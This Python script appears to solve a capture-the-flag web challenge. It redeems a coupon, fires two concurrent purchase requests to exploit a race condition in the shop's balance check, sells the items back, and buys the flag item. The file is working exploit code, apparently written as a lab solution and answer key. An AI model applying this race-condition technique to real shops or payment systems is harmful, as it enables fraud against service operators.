import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from relax1 import Solver as Relax1Solver
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://relax.quoccacorp.com"
RELAX1_FLAG = Relax1Solver().main()

ITEM_DARKMODE = "darkmode"
ITEM_MEMO = "memo"
ITEM_FLAG = "flag"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.item_ids = self.get_item_ids()

    def reset(self):
        return self.session.post(f"{BASE_URL}/service/reset")

    def redeem_coupon(self, coupon: str = RELAX1_FLAG):
        return self.session.post(f"{BASE_URL}/service/coupon", json={"coupon": coupon})

    def get_items_list(self):
        response = self.session.get(f"{BASE_URL}/service/items/list")
        if response.json().get("status"):
            return response.json().get("data", [])

    def get_item_ids(self) -> list[str]:
        return [item["id"] for item in self.get_items_list()]

    def item_action(self, action: str, item: str):
        assert action in ["buy", "sell"], "Invalid action"
        assert item in self.item_ids, "Invalid item ID"
        return self.session.post(f"{BASE_URL}/service/items/{action}", json={"item": item})

    def buy_item(self, item: str):
        return self.item_action("buy", item)

    def sell_item(self, item: str):
        return self.item_action("sell", item)

    def main(self):
        self.reset()
        self.redeem_coupon()

        with ThreadPoolExecutor(max_workers=2) as executor:
            executor.submit(self.buy_item, ITEM_MEMO)
            executor.submit(self.buy_item, ITEM_DARKMODE)

        self.sell_item(ITEM_DARKMODE)
        self.sell_item(ITEM_MEMO)

        self.buy_item(ITEM_FLAG)

        response = self.session.post(f"{BASE_URL}/service/items/get", json={"item": ITEM_FLAG})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()